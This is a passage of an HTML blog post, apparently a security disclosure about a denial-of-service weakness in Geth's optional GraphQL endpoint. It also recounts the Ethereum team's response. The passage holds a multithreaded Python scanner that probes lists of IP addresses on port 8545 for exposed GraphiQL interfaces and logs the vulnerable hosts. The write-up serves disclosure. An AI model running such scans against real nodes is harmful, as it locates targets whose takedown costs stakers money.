</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check_ip</span><span class=p>(</span><span class=n>ip</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># Add &#34;http://&#34; to the IP address</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;http://</span><span class=si>{</span><span class=n>ip</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Append &#34;/graphql/ui&#34; to the URL</span>
</span></span><span class=line><span class=cl>    <span class=n>graphql_url</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>:8545/graphql/ui&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># Send an HTTP GET request</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>graphql_url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Check if the response status code is 200 (OK)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=s2>&#34;graphiql&#34;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>lower</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=c1># Print the &#34;200 OK&#34; result</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>graphql_url</span><span class=si>}</span><span class=s2> - OK&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>output_file</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>graphql_url</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>        <span class=c1>#print(&#34;Error with ip &#34; + str(ip))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Read IP addresses from the input file</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>input_file</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>ips</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Define a lock to ensure thread-safe writing to the output file</span>
</span></span><span class=line><span class=cl><span class=n>output_file_lock</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Lock</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Function to process IPs in parallel</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>process_ips</span><span class=p>(</span><span class=n>start</span><span class=p>,</span> <span class=n>end</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>start</span><span class=p>,</span> <span class=n>end</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>ip</span> <span class=o>=</span> <span class=n>ips</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>  <span class=c1># Remove leading/trailing whitespace</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>ip</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>check_ip</span><span class=p>(</span><span class=n>ip</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Split the list of IPs into chunks for parallel processing</span>
</span></span><span class=line><span class=cl><span class=n>num_threads</span> <span class=o>=</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl><span class=n>chunk_size</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>ips</span><span class=p>)</span> <span class=o>//</span> <span class=n>num_threads</span>
</span></span><span class=line><span class=cl><span class=n>threads</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>num_threads</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>start</span> <span class=o>=</span> <span class=n>i</span> <span class=o>*</span> <span class=n>chunk_size</span>
</span></span><span class=line><span class=cl>    <span class=n>end</span> <span class=o>=</span> <span class=n>start</span> <span class=o>+</span> <span class=n>chunk_size</span> <span class=k>if</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>num_threads</span> <span class=o>-</span> <span class=mi>1</span> <span class=k>else</span> <span class=nb>len</span><span class=p>(</span><span class=n>ips</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>thread</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>process_ips</span><span class=p>,</span> <span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>start</span><span class=p>,</span> <span class=n>end</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>threads</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>thread</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>thread</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Wait for all threads to finish</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>thread</span> <span class=ow>in</span> <span class=n>threads</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>thread</span><span class=o>.</span><span class=n>join</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>This is not a big number, but those servers might have a validator running using those vulnerable instances. Putting Geth down would cause the stakers financial harm since they could not validate attestations (they would even get <a href=https://ethereum.org/fr/developers/docs/consensus-mechanisms/pos/rewards-and-penalties/#penalties target=_blank rel="noopener noreffer">penalties</a>) and they could not participate in block proposals.</p><h2 id=5-ethereum-response>5. Ethereum response</h2><p>Geth team was very reactive and professional.</p><p>Because the GraphQL feature is an option, it is out of scope of the Ethereum Bug Bounty program. More surprisingly, the team has no intention of fixing the issue.</p><p>This seems to be tied to the fact that they consider that <a href=https://geth.ethereum.org/docs/fundamentals/security target=_blank rel="noopener noreffer">RPC port should be blocked in terms of Firewalling</a>.</p><p><figure><a class=lightgallery href=/posts/geth-dos-with-graphql/7-geth-security-old.png title="Old Security page" data-thumbnail=/posts/geth-dos-with-graphql/7-geth-security-old.png data-sub-html="<h2>Firewall Disclamer From Ethereum Foundation</h2><p>Old Security page</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/geth-dos-with-graphql/7-geth-security-old.png data-srcset="/posts/geth-dos-with-graphql/7-geth-security-old.png, /posts/geth-dos-with-graphql/7-geth-security-old.png 1.5x, /posts/geth-dos-with-graphql/7-geth-security-old.png 2x" data-sizes=auto alt=/posts/geth-dos-with-graphql/7-geth-security-old.png width=961 height=197></a><figcaption class=image-caption>Firewall Disclamer From Ethereum Foundation</figcaption></figure></p><p>This however does not eliminate the issue and it is not difficult to find and exploit vulnerable servers in the wild.</p><p>After discussing with the team, they have decided to update the Security page of Geth to warn users about exposing the GraphQL endpoint :</p><p><figure><a class=lightgallery href=/posts/geth-dos-with-graphql/8-eth-response.png title="Ethereum response" data-thumbnail=/posts/geth-dos-with-graphql/8-eth-response.png data-sub-html="<h2>Mail from Ethereum Foundation</h2><p>Ethereum response</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/geth-dos-with-graphql/8-eth-response.png data-srcset="/posts/geth-dos-with-graphql/8-eth-response.png, /posts/geth-dos-with-graphql/8-eth-response.png 1.5x, /posts/geth-dos-with-graphql/8-eth-response.png 2x" data-sizes=auto alt=/posts/geth-dos-with-graphql/8-eth-response.png width=1041 height=318></a><figcaption class=image-caption>Mail from Ethereum Foundation</figcaption></figure></p><p>Since September 5th, the Geth <a href=https://geth.ethereum.org/docs/fundamentals/security target=_blank rel="noopener noreffer">webpage</a> was updated. A special part regarding API Security was added, mentioning GraphQL among other topics :</p><p align=center><img alt="Updated Security page" src=9-geth-new-security.png width=80% height=80%></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-10-15</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/geth/>Geth</a>,&nbsp;<a href=/tags/dos/>DoS</a>,&nbsp;<a href=/tags/graphql/>GraphQL</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/mevsec-introduction/ class=prev rel=prev title="MevSec writeup Introduction"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>MevSec writeup Introduction</a>
<a href=/posts/wormhole-ccq-rest-api-dos/ class=next rel=next title="Taking down Wormhole's CCQ service through REST API">Taking down Wormhole's CCQ service through REST API<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.119.0">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2024</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank></a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/lightgallery/css/lightgallery-bundle.min.css><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:500},comment:{},lightgallery:!0,search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>